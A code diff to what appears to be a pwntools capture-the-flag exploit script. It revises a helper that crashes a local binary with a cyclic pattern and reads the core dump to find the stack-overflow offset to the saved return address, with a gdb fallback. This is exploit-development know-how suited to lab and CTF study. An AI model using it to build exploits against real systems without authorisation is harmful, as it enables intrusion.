@@ -66,20 +66,38 @@ def conn():
 # =============================================================================
 # HELPERS
 # =============================================================================
-def find_offset(pattern_len=200):
+def find_offset(pattern_len=200, n=None):
     """One-shot offset finder for a stack overflow.
 
     Sends a cyclic De Bruijn pattern, lets the target crash, then reads the
     faulting value from the core dump and prints the exact offset to the saved
     return address. Run this ONCE (locally), note the offset, then hardcode it.
+
+    `n` is the cyclic subsequence length: use 4 on 32-bit, 8 on 64-bit (so an
+    8-byte leaked value is looked up correctly). Defaults to the ELF's word size.
+    Corefiles are a Linux feature; on macOS / with cores disabled this won't
+    work -- the except block tells you the manual gdb fallback instead.
     """
+    if n is None:
+        n = 8 if context.bits == 64 else 4
     p = process([BINARY])
-    p.sendline(cyclic(pattern_len))     # TODO: match how the program reads input
+    p.sendline(cyclic(pattern_len, n=n))   # TODO: match how the program reads input
     p.wait()
-    core = p.corefile
-    # x86-64: RSP points just past the overwritten return addr after the ret.
-    fault = core.read(core.rsp, 8)
-    off = cyclic_find(fault[:4])        # cyclic default n=4; use cyclic_find(fault) if n was set
+    try:
+        core = p.corefile
+        # After the ret, the stack pointer points just past the overwritten
+        # return address; read a word of the cyclic pattern from there.
+        fault = core.read(core.sp, n)
+        off = cyclic_find(fault, n=n)
+    except Exception as e:
+        log.failure(
+            f"corefile offset-find failed ({e!r}). Fall back to gdb:\n"
+            f"  1) gdb ./chall ; run < <(python3 -c \"from pwn import *;"
+            f"sys.stdout.buffer.write(cyclic({pattern_len}, n={n}))\")\n"
+            f"  2) at the crash, read the faulting addr (x/gx $sp on 64-bit)\n"
+            f"  3) offset = cyclic_find(<value>, n={n})"
+        )
+        raise
     log.success(f"crash fault bytes = {fault!r}  ->  offset = {off}")
     return off
 
